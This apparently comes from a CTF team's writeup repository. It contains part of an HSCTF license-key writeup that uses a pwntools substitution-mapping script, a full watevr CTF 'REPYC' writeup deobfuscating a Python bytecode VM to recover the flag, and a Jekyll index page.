╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license
gimme dat string: C
generating key for: c
Z
```

you can clearly see the pattern. each letter is simply substituted by some other letter.

so what we can do in this case is that we can get a python dictionary which will store which charecter is substituted by which letter.
once we have that dictionary we resubstitute the charecters in the key given to us.

i made a script for that
```
from pwn import *
import string
context.log_level = "critical"

flag_license = "4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O".replace("-","")

chars = {}

for i in range(0x21,0x7f):
	p = process("./license")
	p.recvuntil("gimme dat string: ")
	p.sendline(chr(i))
	corchar = p.recv(23)[22:]
	
	chars[corchar] = chr(i)
	p.close

flag = ""

for ch in flag_license:
	flag += chars[ch]

print flag
```

running this script gives us partial flag

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ python find_keys.py 
hsctf{k}ith_m~k}s_tr~sh_r}}
```

we can see that "}" is also 3 and "~" is 4
in the end flag comes out to be
```
hsctf{k3ith_m4k3s_tr4sh_r3}
```
  


Thanks for reading that.
                                                                                                ~by [X3eRo0](https://twitter.com/X3eRo0)



### File: writeups/_posts/2019-12-16-watevr-ctf-repyc.md

---
layout: post
author: X3eRo0
--- 
### Challenge: REPYC [REV]

<pre id="user-content-taag_output_text">
                      _      _____ ___________   _____    _______________  ___  ___ ______ 
                     | | /| / / _ /_  __/ __/ | / / _ \  / ___/_  __/ __/ |_  |/ _ <  / _ \
                     | |/ |/ / __ |/ / / _/ | |/ / , _/ / /__  / / / _/  / __// // / /\_, /
                     |__/|__/_/ |_/_/ /___/ |___/_/|_|  \___/ /_/ /_/   /____/\___/_//___/ 
                                                                                           
</pre>

                                                 147 Points - REV

Challenge Description:
 

> woo thi chal sooo repyc!<br>
> **file**: [3nohtyp.pyc](https://github.com/abs0lut3pwn4g3/writeups/blob/master/_posts/watevr_ctf_images/3nohtyp.pyc?raw=true)<br>
> **Difficulty estimate**: Easy

We are given a pyc file and running file on this pyc reveals that its a python 3.6 compiled python bytecode.

```
[~]$ file 3nohtyp.pyc                                                                              
3nohtyp.pyc: python 3.6 byte-compiled
```

so i went with the usuall approach to a python pyc challenge, where the first part is to decompile the bytecode.
i used uncompyle6 ```[~]$ uncompyle6 3nohtyp.pyc > repyc.py``` and the output was very weird just look at this [file](https://pastebin.com/h8dM34Jt)

![repyc.py](https://github.com/abs0lut3pwn4g3/writeups/raw/master/_posts/watevr_ctf_images/repyc.py.PNG)

I never thought that reversing a python source file would be so difficult. At first i thought maybe there is 
python obfuscator which obfuscates variable names with unicode Chinese looking charecters and there are a lot of other obfuscators which uses other techniques similar to this one but unfortunately i didn't find any obfuscator which does this kind of obfuscation, i thought if i found the obfuscator maybe an unobfuscator also exists so that will make my work easier but i was wrong.

Some good obfuscators which i found are: 

 - [PyObfx](https://github.com/PyObfx/PyObfx)
 - [PythonObfuscator](https://github.com/lhr0909/PythonObfuscator)

So the next thing i did was i started replacing each chinese charecter in the file with simple names like i 
translated first 3 lines like this

```
佤 = 0     
侰 = ~佤 * ~佤
俴 = 侰 + 侰      
```

translated to 

```
A = 0
B = ~A * ~A
C = B + B
```

and finally

```
A = 0
B = 1
C = 2
```

And later in the code instead of just using 1, 2 and 3 they use A, B and C so i replaced all the A, B and Cs with their respective values

then comes this function

```def 䯂(䵦):```

At this point i already guessed it was a VM so i named this function VM(byte)

next we see some more declarations which turns out to be registers and memory and stack and stuff
for example 

```괠 = [A] * C ** (C * C)``` translates to ```reg = [0]  * 16```
and ```궓 = [A] * 100``` translates to ```mem = [0] * 100```
and after reading the rest of the code turns out ```괣 = []``` was the stack

so this part looks like this now
```
A = 0
B = 1
C = 2

def VM(byte):
    var1 = 0
    var2 = 0
    reg  = [0] * 16 # array of registers
    mem = [0] * 100 # contains our input
    stack = []
```

then there is a while loop ```while 䵦[굴][A] != '듃':``` which translated to ```byte[var1][0] != '듃' ```
so it was clear that '듃' is the hlt instruction as soon as it encounters '듃' the VM will stop execution

and finally 

```
굸 = 䵦[굴][A].lower()
亀 = 䵦[굴][B:]
```

translated to 
```
opcode = byte[var1][0].lower()
_arg_ = byte[var1][1:]
```

and at this point it was time to analyse all the opcodes, so i used my big brain and only analysed the ones which were actually executed. when you see the call to the VM() function the arguments passed is a list of instructions for sat down and started to do find and replace on all the instructions. 
but then i noticed that the instructions in the bottom were not correctly indented so i fixed that and i ended up with this

![solution.py](https://github.com/abs0lut3pwn4g3/writeups/raw/master/_posts/watevr_ctf_images/solution.py.PNG)

after that i just did a lot of find and replace and i finally fixed the whole python file
and i ended up with this VM Bytecode

```
VM([
 ['mov', 0, 'Authentication token: '],
 ['mem_mov', 0, 0], # mem(r1) = r2
 ['mov', 6, 'á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\x97ÉïÙãäãÖÓ\x9aÕÙÛ\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë'],
 ['mov', 2, 120],
 ['mov', 4, 15],
 ['mov', 3, 1],
 ['multiply', 2, 2, 3], # r2 = r2 * r3
 ['add', 2, 2, 4], # r2 = r2 + r4
 ['nop', 0, 2], # maybe nop
 ['zero_reg', 3], # sets r3 = 0
 ['xor_string', 6, 3],
 ['mov', 0, 'Thanks.'],
 ['mov', 1, 'Authorizing access...'],
 ['print_reg', 0], # prints r0
 ['reg2mem', 0, 0], # set r[arg0] = mem[arg1]
 ['xor_string', 0, 2],
 ['subtract_string', 0, 4],
 ['mov', 5, 19],
 ['strcmp', 0, 6, 5], # check strings ; if not equal r[7] = 1 ; push r[arg[2]]
 ['print_reg', 1],
 ['mov', 1, 'Access denied!'],
 ['print_reg', 1],
 ['hlt']])
```

clearly it loads this huge string into r6 and then xors it with 135 and then subtract 15 from each charecter and then compares with our input so i quicly wrote a decrypt function

```
def find_flag():

    b = 'á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\x97ÉïÙãäãÖÓ\x9aÕÙÛ\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë'
    temp = ''
    for i in range(len(b)):
        temp += chr(ord(b[i]) + 15)

    a = temp
    temp = ""
    for i in range(len(a)):
        temp += chr(ord(a[i]) ^ 135)

    print(temp)
```

and just after that i got the flag

```
[~]$ python3 solution.py                                                                           
watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0}
```




damn that flag is huge and i also wonder whats up with these youtube links?


Thanks for reading that. ~by [X3eRo0](https://twitter.com/X3eRo0)




### File: writeups/index.md

---
layout: default
title: Abs0lut3Pwn4g3
description: writeups
---
<h1>Latest Writeups</h1>

<ul>
  {% for post in site.posts %}
    <li>
      <h2><a href="http://abs0lut3pwn4g3.github.io/writeups{{post.url}}">{{ post.title }}</a></h2>
      <p>{{ post.excerpt }}</p>
    </li>
  {% endfor %}
</ul>

